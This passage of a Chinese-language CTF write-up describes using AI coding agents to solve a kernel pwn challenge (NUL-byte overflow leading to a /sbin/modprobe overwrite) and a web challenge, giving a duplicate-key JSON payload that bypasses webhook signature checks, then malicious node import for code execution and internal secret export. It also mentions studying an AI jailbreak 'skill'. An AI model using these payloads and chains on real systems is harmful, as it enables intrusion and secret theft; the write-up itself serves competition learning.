+<p>已运行 @’ from elftools.elf.elffile import ELFFile from pathlib import Path p=Path(r’.\null\vuln.ko’) with p.open(‘rb’) as f: elf=ELFFile(f) dwarf=elf.get_dwarf_info() for cu in dwarf.iter_CUs(): for die in cu.iter_DIEs(): if die.tag==’DW_TAG_subprogram’: name=die.attributes.get(‘DW_AT_name’) if name: n=name.value.decode(‘latin1’) if n in (‘module_ioctl’,’module_initialize’): print(‘FUNC’,n) for attr in (‘DW_AT_decl_line’,’DW_AT_low_pc’,’DW_AT_high_pc’): if attr in die.attributes: print(attr, die.attributes[attr].value) for child in die.iter_children(): if child.tag==’DW_TAG_variable’: nm=child.attributes.get(‘DW_AT_name’) if nm: print(‘ local’,nm.value.decode()) print() ‘@ | python -<br>我找到了 module_ioctl 的 DWARF 行号：main.c:50，继续把局部变量和行对应关系抠出来。</p>
+<p>反正就是codex一通胡乱分析,也不知道分析了个啥,反正就是执行一堆命令,甚至触发上下文压缩了,最后没办法手动停掉了.</p>
+<p>换Cursor:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">这是一道ctf pwn题目,尝试还原flag.</span><br><span class="line"></span><br><span class="line">结论：`/dev/vuln` 有 **0x400 处的 1-byte NUL 越界写**。</span><br><span class="line"></span><br><span class="line">链路：`pipe` page overlap → 改 `struct file-&gt;f_mode` → 覆写 `/sbin/modprobe` → 触发拿 flag。</span><br><span class="line"></span><br><span class="line">你或许可以参考 ../null/ 里面的文件,这个目录是靶机有的全部文件.</span><br><span class="line"></span><br><span class="line">靶机连接:</span><br><span class="line">nc challenge.jlu-terminal.site 40246</span><br><span class="line">这是靶机地址,相关程序: nc位于&quot;D:\SucksFluorine\CTF\MISC\nc\nc.exe&quot;</span><br></pre></td></tr></table></figure>
+<p>已成功在远程靶机复现利用并拿到 flag。</p>
+<ul>
+<li>目标：<code>challenge.jlu-terminal.site:40246</code></li>
+<li>利用链路与你给的一致：<code>/dev/vuln</code> 的 <code>0x400</code> 处 1-byte NUL OOB 写<br>→ <code>pipe page overlap</code><br>→ 覆写 <code>struct file-&gt;f_mode</code><br>→ 写 <code>/sbin/modprobe</code><br>→ 触发执行 helper 拷贝 <code>/flag</code></li>
+</ul>
+<p>拿到的 flag 是：</p>
+<p><code>flag&#123;kERNE1-OfF_6Y-NU1l_COmE-AND-G3T-ME103546&#125;</code></p>
+<p>另外我在 <code>null2</code> 下补了一个快速上传脚本 <code>solve_remote_fast.py</code>（以及复制了 <code>exploit_modprobe_build</code>、<code>helper_modprobe_build</code>），不过最终稳定出 flag 的是参考目录里的 <code>../null/solve_remote.py</code>（慢一些但可成功）。</p>
+<h2 id="flowforge-web"><a href="#flowforge-web" class="headerlink" title="flowforge - web"></a>flowforge - web</h2><p>后面的时候发现这个题过的人很多,遂让Cursor跟榜冲,codex也一起上,最后是Opus最先拿到flag.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://uemjgjhvmjw3.challenge.jlu-terminal.site 这是一个ctf web题目,尝试找到flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">题目背景</span><br><span class="line">FlowForge 是一套用于托管 AI 工作流的内部平台，支持通过 Webhook 触发自动化流程，并允许维护者导入社区 MCP 节点参与构建执行。</span><br><span class="line"></span><br><span class="line">在一次 staging 到 production 的发布过程中，团队怀疑某些兼容性逻辑和调试接口被错误带入了线上环境。</span><br><span class="line"></span><br><span class="line">你的目标不是拿到管理员密码，而是沿着工作流、构建执行器和内部调试链路，最终导出管理员工作流对应的 secret bundle。</span><br><span class="line"></span><br><span class="line">已知信息</span><br><span class="line">已知普通用户账密：demo / demo123</span><br></pre></td></tr></table></figure>
+<p>中间因为给其他题目(lllarge)开靶机测试所以中断了一下.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请继续,现在的网站是</span><br><span class="line">https://ts0ni2ucc3gb.challenge.jlu-terminal.site </span><br></pre></td></tr></table></figure>
+<p>成功拿到 flag！</p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpiritGame&#123;tH15-IS_a_FLOW-f0rger_4Nd-RUNneR8f7942&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="完整攻击链路总结"><a href="#完整攻击链路总结" class="headerlink" title="完整攻击链路总结"></a>完整攻击链路总结</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul>
+<li>登录 <code>demo/demo123</code>，发现 <code>/api/workflows</code>、<code>/api/nodes</code>、<code>/webhooks/:id</code>、<code>/api/nodes/import</code> 等端点。</li>
+<li>在 <code>/workflows/demo-workflow</code> 的构建日志中发现唯一一条真实日志，指向 <code>/support/incidents/FL0WF0RG3-SG2026-PR3V13W-C0MP47</code>。</li>
+<li>下载工单页面里的 artifact 包 <code>flowforge-partial-src.zip</code>，里面是部分服务端源码、<code>admin_graphql.txt</code>、<code>mcp_inspector.txt</code>、<code>deployment_notes.txt</code>，揭示了关键的内部链：<ul>
+<li><code>127.0.0.1:9001/graphql</code> 用 <code>x-internal-token</code>（runner token）调用 <code>debugExport(flowId)</code> 拿到 <code>exportToken</code></li>
+<li><code>127.0.0.1:9100/debug/export_secret_bundle</code> 用 <code>x-mcp-export-token</code> 兑换 secret bundle</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-Webhook-签名不一致漏洞（核心-0day）"><a href="#2-Webhook-签名不一致漏洞（核心-0day）" class="headerlink" title="2. Webhook 签名不一致漏洞（核心 0day）"></a>2. Webhook 签名不一致漏洞（核心 0day）</h3><p><code>/webhooks/:workflowId</code> 用 <code>firstKeyJsonParse(rawBody)</code> 验签，但用标准 <code>JSON.parse(rawBody)</code> 处理业务事件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const signedView = firstKeyJsonParse(rawBody);</span><br><span class="line">const parsedByFirstKey = JSON.stringify(signedView);</span><br><span class="line">const expectedSig = generateHmac(wf.webhook_secret, parsedByFirstKey);</span><br><span class="line">...</span><br><span class="line">if (actorRole !== &#x27;admin&#x27; &amp;&amp; (signedView.event || &#x27;&#x27;) !== &#x27;workflow.ping&#x27;) &#123; ... &#125;</span><br><span class="line">const businessData = JSON.parse(rawBody);</span><br><span class="line">if (businessData.event === &#x27;workflow.promote&#x27;) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
+<p>构造重复键 body（demo workflow 的 webhook secret <code>whsec_demo_public_001</code> 是公开的）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;event&quot;</span><span class="punctuation">:</span><span class="string">&quot;workflow.ping&quot;</span><span class="punctuation">,</span><span class="attr">&quot;event&quot;</span><span class="punctuation">:</span><span class="string">&quot;workflow.promote&quot;</span><span class="punctuation">,</span><span class="attr">&quot;target&quot;</span><span class="punctuation">:</span><span class="string">&quot;demo&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;maintainer&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>firstKeyJsonParse</code> → <code>event=workflow.ping</code>（绕过 actor role 检查）</li>
+<li><code>JSON.parse</code> → <code>event=workflow.promote</code>（实际执行 promote 逻辑）</li>
+</ul>
+<p>服务器返回：<code>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;message&quot;:&quot;User promoted&quot;,&quot;runner_token&quot;:&quot;runn3r_fl0wf0rg3_...&quot;&#125;</code>，账户升级为 maintainer 并获得 runner token。</p>
+<h3 id="3-MCP-节点注入-→-RCE"><a href="#3-MCP-节点注入-→-RCE" class="headerlink" title="3. MCP 节点注入 → RCE"></a>3. MCP 节点注入 → RCE</h3><p>作为 maintainer 调用 <code>POST /api/nodes/import</code> 注入一个恶意 processor 节点，<code>config.script</code> 里写 Node.js 代码（链式访问 GraphQL + MCP inspector）。</p>
+<h3 id="4-触发构建获取-secret-bundle"><a href="#4-触发构建获取-secret-bundle" class="headerlink" title="4. 触发构建获取 secret bundle"></a>4. 触发构建获取 secret bundle</h3><p><code>POST /api/builds/trigger</code> 指定 <code>workflow_id=demo-workflow</code>（让 <code>getLatestRunnerTokenForUser</code> 能取到刚才 promote 拿到的 runner token），<code>node_id=3</code>，runner 在内网执行：</p>
+<ol>
+<li><code>POST 127.0.0.1:9001/graphql</code> 带 <code>x-internal-token: &lt;RUNNER_TOKEN&gt;</code> 调用 <code>debugExport(flowId:&quot;admin-secret&quot;)</code> → 拿到 <code>exportToken</code></li>
+<li><code>POST 127.0.0.1:9100/debug/export_secret_bundle</code> 带 <code>x-mcp-export-token: &lt;exportToken&gt;</code> 和 <code>&#123;&quot;workflow_id&quot;:&quot;admin-secret&quot;&#125;</code> → 返回 bundle，包含 flag。</li>
+</ol>
+<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><p>猛蹬一天AI,怎么说也算有点收获.</p>
+<ol>
+<li>赶到比赛现场立即圈零食抢饮料.</li>
+<li>如果GPT说”更稳的写法”,一般是GPT完全没有方向了所以才开始改自己的写法</li>
+<li>中转站真香,找时间测一测不同的中转站和各种cli怎么用.</li>
+<li>据榜一说,GPT pro似乎不错,找时间订一个月试试.</li>
+<li>咸鱼拼车,或直接找其他中转站的api.</li>
+<li>AI破甲skill需要研究一下,或者说彻底研究一下skill,真的用上了.</li>
+<li>学一学别人的提示词怎么写的?如何管理多个并行的agent?</li>
+<li>学一学中转怎么接入claude.</li>
+</ol>
+<p>但为什么还是干不过别人呢?我个人认为是工作流和提示词的问题,我不会多开,不会高效管理文件,不会自动一把梭,或者没有订阅gpt…</p>
+<p>下面是我这次总结的skill,或许能未来写提示词有点帮助?<br>但我不知道怎么用欸???  </p>
+<h2 id="skill"><a href="#skill" class="headerlink" title="skill"></a>skill</h2><p>你是一个网安高手,现有一个题目,试拿到flag.</p>
+<p>我的系统配置:<br>Windows11,wsl2.6.1.0,Ubuntu 22.04.1 LTS,docker里面拉了一个kali Linux,有npm,有python.</p>
+<p>相关工具:<br>nc: “D:\SucksFluorine\CTF\MISC\nc\nc.exe”<br>sagemath: “D:\Program Files (x86)\SageMath 9.3\runtime\bin\mintty.exe” -t ‘SageMath 9.3 Console’ -i sagemath.ico /bin/bash —login -c ‘/opt/sagemath-9.3/sage’<br>yafu(分解质因数,用法factor(123456)):”D:\SucksFluorine\CTF\CRYPTO\yafu\yafu64.exe”<br>sqlmap:”D:\SucksFluorine\CTF\WEB\sqlmap-master\sqlmap.py”<br>githack:”D:\SucksFluorine\CTF\WEB\GitHack-master\GitHack.py”<br>dirsearch:”D:\SucksFluorine\CTF\WEB\dirsearch-master\dirsearch.py”  </p>
+<p>你可以调用任何工具解决问题.<br>你可以在python调用任何包,如果该包不存在则允许pip install,能直接解决就不要走弯路.</p>
+<h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><p>AI冲击着做题蛆.<br>Fluu做题有以下几个原则:<br>1.自身有效提升.(例如某些不能用AI的情景需要自身提升等)<br>2.收集灵感(例如这个题很新颖,或者这种题目是怎么出的?)  </p>
+<p>不然就结合AI做题.</p>
+
+  </div>
+</article>
+<script src="https://giscus.app/client.js"
+        data-repo="NaraFluorine/NaraFluorine.github.io"
+        data-repo-id="R_kgDONrzj3A"
+        data-category="Announcements"
+        data-category-id="DIC_kwDONrzj3M4C02ef"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="noborder_dark"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/friends/">友链</a></li>
+        
+          <li><a href="/QSL/">QSL</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpiritGame-2026-ST%E7%86%8A%E7%8C%AB-WP"><span class="toc-number">1.</span> <span class="toc-text">SpiritGame 2026 - ST熊猫 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#day-1"><span class="toc-number">1.1.</span> <span class="toc-text">day -1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#day-0"><span class="toc-number">1.2.</span> <span class="toc-text">day 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Presudo-misc"><span class="toc-number">1.3.</span> <span class="toc-text">Presudo misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxtea-reverse"><span class="toc-number">1.4.</span> <span class="toc-text">xxtea reverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">2.</span> <span class="toc-text">关键结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-sub-401969-%E6%81%92%E8%BF%94%E5%9B%9E-0"><span class="toc-number">2.1.</span> <span class="toc-text">1. sub_401969() 恒返回 0</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-sub-401D61-%E9%80%80%E5%8C%96%E4%B8%BA%E9%80%90%E5%AD%97%E8%8A%82%E6%AF%94%E8%BE%83"><span class="toc-number">3.</span> <span class="toc-text">2. sub_401D61() 退化为逐字节比较</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E7%9C%9F%E6%AD%A3%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.</span> <span class="toc-text">3. 真正的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E6%97%A0%E6%B3%95%E5%94%AF%E4%B8%80%E6%81%A2%E5%A4%8D-flag"><span class="toc-number">4.1.</span> <span class="toc-text">目前无法唯一恢复 flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%A0%E7%8E%B0%E5%9C%A8%E9%9C%80%E8%A6%81%E8%A1%A5%E5%85%85%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">5.</span> <span class="toc-text">你现在需要补充的内容</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E5%8F%AF%E4%BB%A5%E7%A1%AE%E8%AE%A4%E7%9A%84%E4%B8%80%E7%82%B9"><span class="toc-number">6.</span> <span class="toc-text">不过可以确认的一点</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CythonChecker-reverse"><span class="toc-number">6.1.</span> <span class="toc-text">CythonChecker - reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I%E2%80%99m-a-human-reverse"><span class="toc-number">6.2.</span> <span class="toc-text">I’m a human - reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%B2%E8%BF%98%E5%8E%9F%E5%87%BA%E7%9A%84%E6%94%BB%E5%87%BB%E9%93%BE"><span class="toc-number">6.2.1.</span> <span class="toc-text">已还原出的攻击链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BB%93%E8%AE%BA-1"><span class="toc-number">6.2.2.</span> <span class="toc-text">关键结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E5%9C%A8%E5%8D%A1%E4%BD%8F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">6.2.3.</span> <span class="toc-text">现在卡住的原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E7%9B%AE%E5%89%8D%E8%83%BD%E7%A1%AE%E8%AE%A4%E7%9A%84%E6%98%AF"><span class="toc-number">6.2.4.</span> <span class="toc-text">所以目前能确认的是</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E6%9C%AC%E5%9C%B0%E5%B7%B2%E7%BB%8F%E6%8F%90%E5%8F%96%E5%87%BA%E7%9A%84%E4%B8%AD%E9%97%B4%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.5.</span> <span class="toc-text">我本地已经提取出的中间文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AE%BA"><span class="toc-number">6.2.6.</span> <span class="toc-text">结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE"><span class="toc-number">6.2.7.</span> <span class="toc-text">关键证据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E5%8E%9F%E9%93%BE"><span class="toc-number">6.2.8.</span> <span class="toc-text">还原链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%85%B3%E9%94%AE%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.9.</span> <span class="toc-text">本地关键文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Trust-Collapse-web"><span class="toc-number">6.3.</span> <span class="toc-text">Trust Collapse - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Link-Start-reverse"><span class="toc-number">6.4.</span> <span class="toc-text">Link Start! - reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Large-pwn"><span class="toc-number">6.5.</span> <span class="toc-text">Large - pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E7%BB%93%E8%AE%BA"><span class="toc-number">6.5.1.</span> <span class="toc-text">题目结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">6.5.2.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E9%AA%8C%E8%AF%81"><span class="toc-number">6.5.3.</span> <span class="toc-text">本地验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">6.5.4.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E5%90%8E%E7%9B%B4%E6%8E%A5%E8%B7%91"><span class="toc-number">6.5.5.</span> <span class="toc-text">你拿到靶机后直接跑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Artifact-Relay-web"><span class="toc-number">6.6.</span> <span class="toc-text">Artifact Relay - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deliverables-misc"><span class="toc-number">6.7.</span> <span class="toc-text">deliverables - misc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overflow-pwn"><span class="toc-number">6.8.</span> <span class="toc-text">overflow - pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%89%8D%E7%BB%93%E8%AE%BA"><span class="toc-number">6.8.1.</span> <span class="toc-text">目前结论</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%83%85%E5%86%B5"><span class="toc-number">6.8.2.</span> <span class="toc-text">保护情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%B7%B2%E7%BB%8F%E5%86%99%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">6.8.3.</span> <span class="toc-text">我已经写好的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E5%BD%93%E5%89%8D%E9%87%87%E7%94%A8%E7%9A%84%E8%BF%94%E5%9B%9E%E6%96%B9%E6%A1%88"><span class="toc-number">6.8.4.</span> <span class="toc-text">我当前采用的返回方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E7%8E%B0%E5%9C%A8%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E7%9C%8B"><span class="toc-number">6.8.5.</span> <span class="toc-text">你现在可以直接看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BD%A0%E6%8B%BF%E5%88%B0%E9%9D%B6%E6%9C%BA%E5%90%8E"><span class="toc-number">6.8.6.</span> <span class="toc-text">等你拿到靶机后</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag"><span class="toc-number">6.8.7.</span> <span class="toc-text">flag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">6.8.8.</span> <span class="toc-text">结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B4%E6%98%8E"><span class="toc-number">6.8.9.</span> <span class="toc-text">说明</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Seraphim-Crypto"><span class="toc-number">6.9.</span> <span class="toc-text">Seraphim - Crypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ouroboros-misc"><span class="toc-number">6.10.</span> <span class="toc-text">Ouroboros - misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ONNX-%E6%A8%A1%E5%9E%8B%E4%B8%8E%E2%80%9C%E8%A1%94%E5%B0%BE%E8%9B%87-Ouroboros-%E2%80%9D%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="toc-number">6.10.1.</span> <span class="toc-text">ONNX 模型与“衔尾蛇 (Ouroboros)”的关系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%BF%98%E5%8E%9F-Flag-%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">6.10.2.</span> <span class="toc-text">尝试还原 Flag 的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E6%8F%90%E5%8F%96%E6%AF%94%E7%89%B9%E9%93%BE%EF%BC%88Bit-chain%EF%BC%89"><span class="toc-number">6.10.2.1.</span> <span class="toc-text">方法一：静态分析提取比特链（Bit-chain）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B%EF%BC%88%E6%8E%A8%E8%8D%90%EF%BC%8C%E6%9C%80%E5%BF%AB%E6%8D%B7%EF%BC%89"><span class="toc-number">6.10.2.2.</span> <span class="toc-text">方法二：动态执行模型（推荐，最快捷）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NULL-pwn"><span class="toc-number">6.11.</span> <span class="toc-text">NULL - pwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flowforge-web"><span class="toc-number">6.12.</span> <span class="toc-text">flowforge - web</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flag"><span class="toc-number">6.13.</span> <span class="toc-text">Flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E6%94%BB%E5%87%BB%E9%93%BE%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-number">6.14.</span> <span class="toc-text">完整攻击链路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.14.1.</span> <span class="toc-text">1. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Webhook-%E7%AD%BE%E5%90%8D%E4%B8%8D%E4%B8%80%E8%87%B4%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%A0%B8%E5%BF%83-0day%EF%BC%89"><span class="toc-number">6.14.2.</span> <span class="toc-text">2. Webhook 签名不一致漏洞（核心 0day）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-MCP-%E8%8A%82%E7%82%B9%E6%B3%A8%E5%85%A5-%E2%86%92-RCE"><span class="toc-number">6.14.3.</span> <span class="toc-text">3. MCP 节点注入 → RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%A7%A6%E5%8F%91%E6%9E%84%E5%BB%BA%E8%8E%B7%E5%8F%96-secret-bundle"><span class="toc-number">6.14.4.</span> <span class="toc-text">4. 触发构建获取 secret bundle</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-number">7.</span> <span class="toc-text">收获</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#skill"><span class="toc-number">7.1.</span> <span class="toc-text">skill</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%9A%E9%A2%98"><span class="toc-number">7.2.</span> <span class="toc-text">做题</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&text=SpiritGame 2026 wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&is_video=false&description=SpiritGame 2026 wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SpiritGame 2026 wp&body=Check out this article: https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&title=SpiritGame 2026 wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&name=SpiritGame 2026 wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://narafluorine.github.io/2026/05/18/20025_SpiritGame2026_WP/&t=SpiritGame 2026 wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
